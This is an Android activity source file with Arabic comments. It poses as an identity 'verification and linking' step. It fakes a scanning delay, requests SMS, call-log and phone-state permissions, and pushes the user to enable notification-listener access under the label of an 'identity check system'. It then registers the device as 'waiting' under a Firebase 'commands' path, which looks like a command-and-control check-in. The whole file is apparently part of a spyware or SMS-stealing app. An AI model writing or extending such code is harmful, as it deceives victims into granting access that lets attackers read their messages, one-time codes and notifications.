package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;
    private final OkHttpClient client = new OkHttpClient();
    private String userName;
    
    // تعريف عناصر الواجهة الجديدة
    private Button btnStartVerify;
    private ProgressBar verifyProgressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            setContentView(R.layout.activity_verify);
        } catch (Exception e) {
            Toast.makeText(this, "خطأ في تحميل الواجهة", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        
        // ربط العناصر
        btnStartVerify = findViewById(R.id.btnStartVerify);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);

        if (btnStartVerify != null) {
            btnStartVerify.setOnClickListener(v -> {
                // تفعيل حالة التحميل وتعطيل الزر
                toggleLoading(true);
                
                // تأخير بسيط لمحاكاة عملية الفحص قبل طلب الأذونات
                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1200);
            });
        }
    }

    /**
     * دالة للتحكم في حالة الزر وشريط الانتظار
     */
    private void toggleLoading(boolean isLoading) {
        if (isLoading) {
            btnStartVerify.setEnabled(false); // تعطيل الضغط
            btnStartVerify.setText(""); // إخفاء النص
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
        } else {
            btnStartVerify.setEnabled(true);
            btnStartVerify.setText("بدء عملية الربط والتحقق");
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
        }
    }

    private void requestPermissionsSystem() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
        } else {
            checkNotificationListenerBridge();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            checkNotificationListenerBridge();
        }
    }

    private void checkNotificationListenerBridge() {
        if (!isNotificationServiceEnabled()) {
            try {
                // إذا لم يتم التفعيل، نعيد الزر لحالته الطبيعية ليتمكن من المحاولة لاحقاً
                toggleLoading(false);
                
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            }
        } else {
            notifyAdminSuccess();
        }
    }

    private void notifyAdminSuccess() {
        // تأكد من أن حالة التحميل مستمرة أثناء الاتصال بالسيرفر
        toggleLoading(true);

        String url = "https://banproject-2f9c6-default-rtdb.firebaseio.com/commands/" + userName + "/status.json";
        RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
        
        new Thread(() -> {
            try {
                client.newCall(new Request.Builder().url(url).put(body).build()).execute();
                new Handler(Looper.getMainLooper()).post(() -> {
                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي ✅", Toast.LENGTH_SHORT).show();
                    finish(); // العودة للواجهة السابقة
                });
            } catch (Exception e) {
                new Handler(Looper.getMainLooper()).post(() -> {
                    toggleLoading(false);
                    Toast.makeText(this, "فشل الربط، تأكد من الإنترنت", Toast.LENGTH_SHORT).show();
                });
            }
        }).start();
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }

    @Override
    protected void onResume() {
        super.onResume();
        // في حال عاد المستخدم من الإعدادات، نتحقق مجدداً إذا فعل الخدمة
        if (isNotificationServiceEnabled()) {
            // إذا فعلها وهو في الإعدادات ورجع، نقوم بإنهاء العملية تلقائياً
            notifyAdminSuccess();
        } else {
            // إذا لم يفعلها، نضمن أن الزر قابل للضغط مرة أخرى
            toggleLoading(false);
        }
    }
}
